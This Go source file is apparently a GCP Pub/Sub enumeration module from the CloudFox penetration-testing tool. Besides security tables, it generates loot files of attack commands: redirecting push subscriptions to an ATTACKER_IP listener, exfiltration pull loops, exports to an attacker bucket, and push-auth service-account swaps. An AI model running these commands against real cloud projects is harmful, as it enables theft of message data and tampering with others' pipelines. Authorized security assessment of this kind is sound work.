package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	PubSubService "github.com/BishopFox/cloudfox/gcp/services/pubsubService"
	"github.com/BishopFox/cloudfox/gcp/shared"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

var GCPPubSubCommand = &cobra.Command{
	Use:     globals.GCP_PUBSUB_MODULE_NAME,
	Aliases: []string{"ps", "topics", "subscriptions"},
	Short:   "Enumerate Pub/Sub topics and subscriptions with security analysis",
	Long: `Enumerate Pub/Sub topics and subscriptions across projects with security-relevant details.

Features:
- Lists all Pub/Sub topics and subscriptions
- Shows IAM configuration and public access
- Identifies push endpoints and their configurations
- Shows dead letter topics and retry policies
- Detects BigQuery and Cloud Storage exports
- Generates gcloud commands for further analysis

Security Columns:
- PublicPublish: Whether allUsers/allAuthenticatedUsers can publish
- PublicSubscribe: Whether allUsers/allAuthenticatedUsers can subscribe
- KMS: Customer-managed encryption key status
- PushEndpoint: External URL receiving messages (data exfiltration risk)
- Exports: BigQuery/Cloud Storage export destinations

Attack Surface:
- Public topics allow message injection
- Public subscriptions allow message reading
- Push endpoints may leak sensitive data
- Cross-project subscriptions indicate trust relationships`,
	Run: runGCPPubSubCommand,
}

// ------------------------------
// Module Struct
// ------------------------------
type PubSubModule struct {
	gcpinternal.BaseGCPModule

	ProjectTopics        map[string][]PubSubService.TopicInfo        // projectID -> topics
	ProjectSubscriptions map[string][]PubSubService.SubscriptionInfo // projectID -> subscriptions
	LootMap              map[string]map[string]*internal.LootFile    // projectID -> loot files
	mu                   sync.Mutex
}

// ------------------------------
// Output Struct
// ------------------------------
type PubSubOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o PubSubOutput) TableFiles() []internal.TableFile { return o.Table }
func (o PubSubOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPPubSubCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, globals.GCP_PUBSUB_MODULE_NAME)
	if err != nil {
		return
	}

	module := &PubSubModule{
		BaseGCPModule:        gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectTopics:        make(map[string][]PubSubService.TopicInfo),
		ProjectSubscriptions: make(map[string][]PubSubService.SubscriptionInfo),
		LootMap:              make(map[string]map[string]*internal.LootFile),
	}

	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *PubSubModule) Execute(ctx context.Context, logger internal.Logger) {
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, globals.GCP_PUBSUB_MODULE_NAME, m.processProject)

	allTopics := m.getAllTopics()
	allSubs := m.getAllSubscriptions()

	totalResources := len(allTopics) + len(allSubs)
	if totalResources == 0 {
		logger.InfoM("No Pub/Sub topics or subscriptions found", globals.GCP_PUBSUB_MODULE_NAME)
		return
	}

	// Count public resources and push subscriptions
	publicTopics := 0
	publicSubs := 0
	pushSubs := 0
	for _, topic := range allTopics {
		for _, binding := range topic.IAMBindings {
			if shared.IsPublicPrincipal(binding.Member) {
				publicTopics++
				break
			}
		}
	}
	for _, sub := range allSubs {
		for _, binding := range sub.IAMBindings {
			if shared.IsPublicPrincipal(binding.Member) {
				publicSubs++
				break
			}
		}
		if sub.PushEndpoint != "" {
			pushSubs++
		}
	}

	msg := fmt.Sprintf("Found %d topic(s), %d subscription(s)", len(allTopics), len(allSubs))
	if publicTopics > 0 || publicSubs > 0 {
		msg += fmt.Sprintf(" (%d public topics, %d public subs)", publicTopics, publicSubs)
	}
	if pushSubs > 0 {
		msg += fmt.Sprintf(" [%d push endpoints]", pushSubs)
	}
	logger.SuccessM(msg, globals.GCP_PUBSUB_MODULE_NAME)

	m.writeOutput(ctx, logger)
}

// getAllTopics returns all topics from all projects
func (m *PubSubModule) getAllTopics() []PubSubService.TopicInfo {
	var all []PubSubService.TopicInfo
	for _, topics := range m.ProjectTopics {
		all = append(all, topics...)
	}
	return all
}

// getAllSubscriptions returns all subscriptions from all projects
func (m *PubSubModule) getAllSubscriptions() []PubSubService.SubscriptionInfo {
	var all []PubSubService.SubscriptionInfo
	for _, subs := range m.ProjectSubscriptions {
		all = append(all, subs...)
	}
	return all
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *PubSubModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Enumerating Pub/Sub in project: %s", projectID), globals.GCP_PUBSUB_MODULE_NAME)
	}

	ps := PubSubService.New()

	var topics []PubSubService.TopicInfo
	var subs []PubSubService.SubscriptionInfo

	// Get topics
	topicsResult, err := ps.Topics(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, globals.GCP_PUBSUB_MODULE_NAME,
			fmt.Sprintf("Could not enumerate Pub/Sub topics in project %s", projectID))
	} else {
		topics = topicsResult
	}

	// Get subscriptions
	subsResult, err := ps.Subscriptions(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, globals.GCP_PUBSUB_MODULE_NAME,
			fmt.Sprintf("Could not enumerate Pub/Sub subscriptions in project %s", projectID))
	} else {
		subs = subsResult
	}

	// Thread-safe store per-project
	m.mu.Lock()
	m.ProjectTopics[projectID] = topics
	m.ProjectSubscriptions[projectID] = subs

	// Initialize loot for this project
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["pubsub-commands"] = &internal.LootFile{
			Name:     "pubsub-commands",
			Contents: "# Pub/Sub Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization\n\n",
		}
	}

	for _, topic := range topics {
		m.addTopicToLoot(projectID, topic)
	}
	for _, sub := range subs {
		m.addSubscriptionToLoot(projectID, sub)
	}
	m.mu.Unlock()

	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Found %d topic(s), %d subscription(s) in project %s", len(topics), len(subs), projectID), globals.GCP_PUBSUB_MODULE_NAME)
	}
}

// ------------------------------
// Loot File Management
// ------------------------------
func (m *PubSubModule) addTopicToLoot(projectID string, topic PubSubService.TopicInfo) {
	lootFile := m.LootMap[projectID]["pubsub-commands"]
	if lootFile == nil {
		return
	}

	// Check for public access
	publicAccess := ""
	for _, binding := range topic.IAMBindings {
		if shared.IsPublicPrincipal(binding.Member) {
			publicAccess = " [PUBLIC ACCESS]"
			break
		}
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# TOPIC: %s%s\n"+
			"# =============================================================================\n"+
			"# Project: %s\n"+
			"# Subscriptions: %d\n",
		topic.Name, publicAccess,
		topic.ProjectID, topic.SubscriptionCount,
	)

	if topic.KmsKeyName != "" {
		lootFile.Contents += fmt.Sprintf("# KMS Key: %s\n", topic.KmsKeyName)
	}

	if topic.SchemaSettings != "" {
		lootFile.Contents += fmt.Sprintf("# Schema: %s\n", topic.SchemaSettings)
	}

	if len(topic.IAMBindings) > 0 {
		lootFile.Contents += "# IAM Bindings:\n"
		for _, binding := range topic.IAMBindings {
			lootFile.Contents += fmt.Sprintf("#   %s -> %s\n", binding.Role, binding.Member)
		}
	}

	lootFile.Contents += fmt.Sprintf(`
# === ENUMERATION COMMANDS ===

# Describe topic
gcloud pubsub topics describe %s --project=%s

# Get IAM policy
gcloud pubsub topics get-iam-policy %s --project=%s

# List all subscriptions for this topic
gcloud pubsub topics list-subscriptions %s --project=%s

# List snapshots for this topic
gcloud pubsub snapshots list --filter="topic:%s" --project=%s

# === EXPLOIT COMMANDS ===

# Publish a test message (requires pubsub.topics.publish)
gcloud pubsub topics publish %s --message='{"test": "message"}' --project=%s

# Publish message with attributes
gcloud pubsub topics publish %s --message='test' --attribute='key1=value1,key2=value2' --project=%s

# Publish from file
# echo '{"sensitive": "data"}' > message.json
# gcloud pubsub topics publish %s --message="$(cat message.json)" --project=%s

# === ATTACK SCENARIOS ===

# Message Injection: If you can publish, inject malicious messages
# gcloud pubsub topics publish %s --message='{"cmd": "malicious_command"}' --project=%s

# Create a new subscription to eavesdrop on messages (requires pubsub.subscriptions.create)
# gcloud pubsub subscriptions create attacker-sub-%s --topic=%s --project=%s

# === NETCAT / WEBHOOK CAPTURE ===

# Step 1: Start a listener on your attacker host (e.g., a VM with a public IP)
#   nc -lk 4444
# Or use a simple HTTP server to see full requests:
#   python3 -c "from http.server import HTTPServer, BaseHTTPRequestHandler; import json
#   class H(BaseHTTPRequestHandler):
#       def do_POST(self):
#           data = self.rfile.read(int(self.headers['Content-Length']))
#           print(json.dumps({'headers': dict(self.headers), 'body': data.decode()}, indent=2))
#           self.send_response(200); self.end_headers()
#   HTTPServer(('0.0.0.0', 8080), H).serve_forever()"

# Step 2: Create a push subscription pointed at your listener (requires pubsub.subscriptions.create)
# gcloud pubsub subscriptions create exfil-sub-%s --topic=%s --project=%s --push-endpoint="https://ATTACKER_IP:8080/capture"

# All new messages published to this topic will be POSTed to your listener as JSON
# The message body is base64-encoded in the POST payload under .message.data

`,
		topic.Name, topic.ProjectID,
		topic.Name, topic.ProjectID,
		topic.Name, topic.ProjectID,
		topic.Name, topic.ProjectID,
		topic.Name, topic.ProjectID,
		topic.Name, topic.ProjectID,
		topic.Name, topic.ProjectID,
		topic.Name, topic.ProjectID,
		topic.Name, topic.Name, topic.ProjectID,
		topic.Name, topic.Name, topic.ProjectID,
	)
}

func (m *PubSubModule) addSubscriptionToLoot(projectID string, sub PubSubService.SubscriptionInfo) {
	lootFile := m.LootMap[projectID]["pubsub-commands"]
	if lootFile == nil {
		return
	}

	// Check for public access
	publicAccess := ""
	for _, binding := range sub.IAMBindings {
		if shared.IsPublicPrincipal(binding.Member) {
			publicAccess = " [PUBLIC ACCESS]"
			break
		}
	}

	lootFile.Contents += fmt.Sprintf(
		"# -----------------------------------------------------------------------------\n"+
			"# SUBSCRIPTION: %s%s\n"+
			"# -----------------------------------------------------------------------------\n"+
			"# Project: %s\n"+
			"# Topic: %s\n",
		sub.Name, publicAccess,
		sub.ProjectID, sub.Topic,
	)

	// Cross-project info
	if sub.TopicProject != "" && sub.TopicProject != sub.ProjectID {
		lootFile.Contents += fmt.Sprintf("# Cross-Project: Yes (topic in %s)\n", sub.TopicProject)
	}

	// Subscription type
	subType := "Pull"
	if sub.PushEndpoint != "" {
		subType = "Push"
	} else if sub.BigQueryTable != "" {
		subType = "BigQuery Export"
	} else if sub.CloudStorageBucket != "" {
		subType = "Cloud Storage Export"
	}
	lootFile.Contents += fmt.Sprintf("# Type: %s\n", subType)

	// Push endpoint info
	if sub.PushEndpoint != "" {
		lootFile.Contents += fmt.Sprintf(
			"# Push Endpoint: %s\n"+
				"# Push Service Account: %s\n",
			sub.PushEndpoint,
			sub.PushServiceAccount,
		)
	}

	// Export destinations
	if sub.BigQueryTable != "" {
		lootFile.Contents += fmt.Sprintf("# BigQuery Export: %s\n", sub.BigQueryTable)
	}
	if sub.CloudStorageBucket != "" {
		lootFile.Contents += fmt.Sprintf("# GCS Export: %s\n", sub.CloudStorageBucket)
	}

	// Dead letter config
	if sub.DeadLetterTopic != "" {
		lootFile.Contents += fmt.Sprintf(
			"# Dead Letter Topic: %s (Max Attempts: %d)\n",
			sub.DeadLetterTopic,
			sub.MaxDeliveryAttempts,
		)
	}

	// Filter
	if sub.Filter != "" {
		lootFile.Contents += fmt.Sprintf("# Filter: %s\n", sub.Filter)
	}

	// IAM bindings
	if len(sub.IAMBindings) > 0 {
		lootFile.Contents += "# IAM Bindings:\n"
		for _, binding := range sub.IAMBindings {
			lootFile.Contents += fmt.Sprintf("#   %s -> %s\n", binding.Role, binding.Member)
		}
	}

	lootFile.Contents += fmt.Sprintf(`
# === ENUMERATION COMMANDS ===

# Describe subscription
gcloud pubsub subscriptions describe %s --project=%s

# Get IAM policy
gcloud pubsub subscriptions get-iam-policy %s --project=%s

# List snapshots for this subscription
gcloud pubsub snapshots list --project=%s

# === EXPLOIT COMMANDS ===

# Pull messages WITHOUT acknowledging (peek at messages, they stay in queue)
gcloud pubsub subscriptions pull %s --project=%s --limit=100

# Pull and acknowledge messages (removes them from queue - destructive!)
gcloud pubsub subscriptions pull %s --project=%s --limit=100 --auto-ack

# Pull messages with wait (useful for real-time monitoring)
# gcloud pubsub subscriptions pull %s --project=%s --limit=10 --wait

# === MESSAGE EXFILTRATION ===

# Continuous message pulling loop (exfiltrate all messages)
# while true; do gcloud pubsub subscriptions pull %s --project=%s --limit=100 --auto-ack --format=json >> exfiltrated_messages.json; sleep 1; done

# Pull and save to file
# gcloud pubsub subscriptions pull %s --project=%s --limit=1000 --format=json > messages.json

# === NETCAT / WEBHOOK CAPTURE ===

# Convert this subscription to push mode and redirect messages to your listener (requires pubsub.subscriptions.update)
# Step 1: Start a listener on your attacker host
#   nc -lk 4444
# Or use a Python HTTP server:
#   python3 -c "from http.server import HTTPServer, BaseHTTPRequestHandler; import json
#   class H(BaseHTTPRequestHandler):
#       def do_POST(self):
#           data = self.rfile.read(int(self.headers['Content-Length']))
#           print(json.dumps({'headers': dict(self.headers), 'body': data.decode()}, indent=2))
#           self.send_response(200); self.end_headers()
#   HTTPServer(('0.0.0.0', 8080), H).serve_forever()"
# Step 2: Set push endpoint on this subscription
# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint="https://ATTACKER_IP:8080/capture"
# Messages will be POSTed as JSON with base64-encoded data in .message.data

# === SNAPSHOT & SEEK ATTACKS ===

# Create a snapshot of current subscription state (requires pubsub.snapshots.create)
# gcloud pubsub snapshots create snapshot-%s --subscription=%s --project=%s

# Seek to beginning of retention period (replay all retained messages)
# gcloud pubsub subscriptions seek %s --time="2024-01-01T00:00:00Z" --project=%s

# Seek to a snapshot (replay messages from snapshot point)
# gcloud pubsub subscriptions seek %s --snapshot=snapshot-%s --project=%s

`,
		sub.Name, sub.ProjectID,
		sub.Name, sub.ProjectID,
		sub.ProjectID,
		sub.Name, sub.ProjectID,
		sub.Name, sub.ProjectID,
		sub.Name, sub.ProjectID,
		sub.Name, sub.ProjectID,
		sub.Name, sub.ProjectID,
		sub.Name, sub.ProjectID,
		sub.Name, sub.Name, sub.ProjectID,
		sub.Name, sub.ProjectID,
		sub.Name, sub.Name, sub.ProjectID,
	)

	// Push endpoint specific attacks
	if sub.PushEndpoint != "" {
		lootFile.Contents += fmt.Sprintf(`# === PUSH ENDPOINT ATTACKS ===

# Current push endpoint: %s
# Push SA: %s

# Redirect messages to attacker listener (requires pubsub.subscriptions.update)
# Step 1: Start listener: nc -lk 4444  (or python3 HTTP server on port 8080)
# Step 2: Modify push endpoint:
# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint="https://ATTACKER_IP:8080/capture"

# Remove push config (convert to pull subscription for easier exfiltration)
# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint=""

# Change push authentication (OIDC token attack)
# gcloud pubsub subscriptions modify-push-config %s --project=%s --push-endpoint="%s" --push-auth-service-account="attacker-sa@attacker-project.iam.gserviceaccount.com"

`,
			sub.PushEndpoint, sub.PushServiceAccount,
			sub.Name, sub.ProjectID,
			sub.Name, sub.ProjectID,
			sub.Name, sub.ProjectID, sub.PushEndpoint,
		)
	}

	// BigQuery export attacks
	if sub.BigQueryTable != "" {
		lootFile.Contents += fmt.Sprintf(`# === BIGQUERY EXPORT ATTACKS ===

# Current export table: %s

# Query exported messages from BigQuery
bq query --use_legacy_sql=false 'SELECT * FROM %s LIMIT 1000'

# Export BigQuery table to GCS for bulk download
# bq extract --destination_format=NEWLINE_DELIMITED_JSON '%s' gs://attacker-bucket/exported_messages/*.json

# Show table schema (understand message structure)
bq show --schema %s

`,
			sub.BigQueryTable,
			strings.Replace(sub.BigQueryTable, ":", ".", 1),
			sub.BigQueryTable,
			sub.BigQueryTable,
		)
	}

	// GCS export attacks
	if sub.CloudStorageBucket != "" {
		lootFile.Contents += fmt.Sprintf(`# === CLOUD STORAGE EXPORT ATTACKS ===

# Current export bucket: %s

# List exported message files
gsutil ls -la gs://%s/

# Download all exported messages
gsutil -m cp -r gs://%s/ ./exported_messages/

# Stream new exports as they arrive
# gsutil -m rsync -r gs://%s/ ./exported_messages/

`,
			sub.CloudStorageBucket,
			sub.CloudStorageBucket,
			sub.CloudStorageBucket,
			sub.CloudStorageBucket,
		)
	}

	// Dead letter topic attacks
	if sub.DeadLetterTopic != "" {
		lootFile.Contents += fmt.Sprintf(`# === DEAD LETTER TOPIC ATTACKS ===

# Dead letter topic: %s
# Messages that fail delivery %d times go here

# Create subscription to dead letter topic to capture failed messages
# gcloud pubsub subscriptions create dlq-eavesdrop --topic=%s --project=%s

# Dead letters often contain sensitive data from failed processing

`,
			sub.DeadLetterTopic, sub.MaxDeliveryAttempts,
			sub.DeadLetterTopic, sub.ProjectID,
		)
	}

	// Cross-project attack scenarios
	if sub.TopicProject != "" && sub.TopicProject != sub.ProjectID {
		lootFile.Contents += fmt.Sprintf(`# === CROSS-PROJECT ATTACK SCENARIOS ===

# This subscription reads from topic in project: %s
# This indicates a trust relationship between projects

# Check if you have access to the source topic
gcloud pubsub topics describe %s --project=%s

# If you can publish to the source topic, you can inject messages
# gcloud pubsub topics publish %s --message='injected' --project=%s

`,
			sub.TopicProject,
			sub.Topic, sub.TopicProject,
			sub.Topic, sub.TopicProject,
		)
	}

	lootFile.Contents += "\n"
}

// ------------------------------
// Output Generation
// ------------------------------
func (m *PubSubModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *PubSubModule) getTopicsHeader() []string {
	return []string{
		"Project",
		"Topic",
		"Subscriptions",
		"Schema",
		"KMS Key",
		"Retention",
		"Public Publish",
		"IAM Binding Role",
		"IAM Binding Principal",
	}
}

func (m *PubSubModule) getSubsHeader() []string {
	return []string{
		"Project",
		"Subscription",
		"Topic",
		"Topic Project",
		"Type",
		"Destination",
		"Filter",
		"Ack Deadline",
		"Retention",
		"Dead Letter",
		"Public Subscribe",
		"IAM Binding Role",
		"IAM Binding Principal",
	}
}

func (m *PubSubModule) topicsToTableBody(topics []PubSubService.TopicInfo) [][]string {
	var body [][]string
	for _, topic := range topics {
		schema := "-"
		if topic.SchemaSettings != "" {
			schema = topic.SchemaSettings
		}

		kmsKey := "-"
		if topic.KmsKeyName != "" {
			// Extract just the key name from full path for readability
			parts := strings.Split(topic.KmsKeyName, "/")
			if len(parts) > 0 {
				kmsKey = parts[len(parts)-1]
			} else {
				kmsKey = topic.KmsKeyName
			}
		}

		retention := "-"
		if topic.MessageRetentionDuration != "" {
			retention = topic.MessageRetentionDuration
		}

		// Check for public publish access
		publicPublish := "No"
		for _, binding := range topic.IAMBindings {
			if shared.IsPublicPrincipal(binding.Member) {
				// Check if role allows publishing
				if strings.Contains(binding.Role, "publisher") ||
					strings.Contains(binding.Role, "admin") ||
					binding.Role == "roles/pubsub.editor" ||
					binding.Role == "roles/owner" ||
					binding.Role == "roles/editor" {
					publicPublish = "Yes"
					break
				}
			}
		}

		if len(topic.IAMBindings) > 0 {
			for _, binding := range topic.IAMBindings {
				body = append(body, []string{
					m.GetProjectName(topic.ProjectID),
					topic.Name,
					fmt.Sprintf("%d", topic.SubscriptionCount),
					schema,
					kmsKey,
					retention,
					publicPublish,
					binding.Role,
					binding.Member,
				})
			}
		} else {
			body = append(body, []string{
				m.GetProjectName(topic.ProjectID),
				topic.Name,
				fmt.Sprintf("%d", topic.SubscriptionCount),
				schema,
				kmsKey,
				retention,
				publicPublish,
				"-",
				"-",
			})
		}
	}
	return body
}

func (m *PubSubModule) subsToTableBody(subs []PubSubService.SubscriptionInfo) [][]string {
	var body [][]string
	for _, sub := range subs {
		subType := "Pull"
		destination := "-"
		if sub.PushEndpoint != "" {
			subType = "Push"
			destination = sub.PushEndpoint
		} else if sub.BigQueryTable != "" {
			subType = "BigQuery"
			destination = sub.BigQueryTable
		} else if sub.CloudStorageBucket != "" {
			subType = "GCS"
			destination = sub.CloudStorageBucket
		}

		topicProject := "-"
		if sub.TopicProject != "" && sub.TopicProject != sub.ProjectID {
			topicProject = sub.TopicProject
		}

		filter := "-"
		if sub.Filter != "" {
			filter = sub.Filter
		}

		ackDeadline := "-"
		if sub.AckDeadlineSeconds > 0 {
			ackDeadline = fmt.Sprintf("%ds", sub.AckDeadlineSeconds)
		}

		retention := "-"
		if sub.MessageRetention != "" {
			retention = sub.MessageRetention
		}

		deadLetter := "-"
		if sub.DeadLetterTopic != "" {
			deadLetter = sub.DeadLetterTopic
		}

		// Check for public subscribe access
		publicSubscribe := "No"
		for _, binding := range sub.IAMBindings {
			if shared.IsPublicPrincipal(binding.Member) {
				// Check if role allows subscribing/consuming
				if strings.Contains(binding.Role, "subscriber") ||
					strings.Contains(binding.Role, "admin") ||
					binding.Role == "roles/pubsub.editor" ||
					binding.Role == "roles/pubsub.viewer" ||
					binding.Role == "roles/owner" ||
					binding.Role == "roles/editor" ||
					binding.Role == "roles/viewer" {
					publicSubscribe = "Yes"
					break
				}
			}
		}

		if len(sub.IAMBindings) > 0 {
			for _, binding := range sub.IAMBindings {
				body = append(body, []string{
					m.GetProjectName(sub.ProjectID),
					sub.Name,
					sub.Topic,
					topicProject,
					subType,
					destination,
					filter,
					ackDeadline,
					retention,
					deadLetter,
					publicSubscribe,
					binding.Role,
					binding.Member,
				})
			}
		} else {
			body = append(body, []string{
				m.GetProjectName(sub.ProjectID),
				sub.Name,
				sub.Topic,
				topicProject,
				subType,
				destination,
				filter,
				ackDeadline,
				retention,
				deadLetter,
				publicSubscribe,
				"-",
				"-",
			})
		}
	}
	return body
}

func (m *PubSubModule) buildTablesForProject(projectID string) []internal.TableFile {
	topics := m.ProjectTopics[projectID]
	subs := m.ProjectSubscriptions[projectID]

	topicsBody := m.topicsToTableBody(topics)
	subsBody := m.subsToTableBody(subs)

	var tableFiles []internal.TableFile
	if len(topicsBody) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   globals.GCP_PUBSUB_MODULE_NAME + "-topics",
			Header: m.getTopicsHeader(),
			Body:   topicsBody,
		})
	}
	if len(subsBody) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   globals.GCP_PUBSUB_MODULE_NAME + "-subscriptions",
			Header: m.getSubsHeader(),
			Body:   subsBody,
		})
	}
	return tableFiles
}

func (m *PubSubModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	projectsWithData := make(map[string]bool)
	for projectID := range m.ProjectTopics {
		projectsWithData[projectID] = true
	}
	for projectID := range m.ProjectSubscriptions {
		projectsWithData[projectID] = true
	}

	for projectID := range projectsWithData {
		tableFiles := m.buildTablesForProject(projectID)

		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		outputData.ProjectLevelData[projectID] = PubSubOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart(
		"gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), globals.GCP_PUBSUB_MODULE_NAME)
		m.CommandCounter.Error++
	}
}

func (m *PubSubModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	allTopics := m.getAllTopics()
	allSubs := m.getAllSubscriptions()

	topicsBody := m.topicsToTableBody(allTopics)
	subsBody := m.subsToTableBody(allSubs)

	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	var tableFiles []internal.TableFile
	if len(topicsBody) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   globals.GCP_PUBSUB_MODULE_NAME + "-topics",
			Header: m.getTopicsHeader(),
			Body:   topicsBody,
		})
	}
	if len(subsBody) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   globals.GCP_PUBSUB_MODULE_NAME + "-subscriptions",
			Header: m.getSubsHeader(),
			Body:   subsBody,
		})
	}

	output := PubSubOutput{Table: tableFiles, Loot: lootFiles}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, id := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(id)
	}

	err := internal.HandleOutputSmart(
		"gcp", m.Format, m.OutputDirectory, m.Verbosity, m.WrapTable,
		"project", m.ProjectIDs, scopeNames, m.Account, output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.GCP_PUBSUB_MODULE_NAME)
		m.CommandCounter.Error++
	}
}


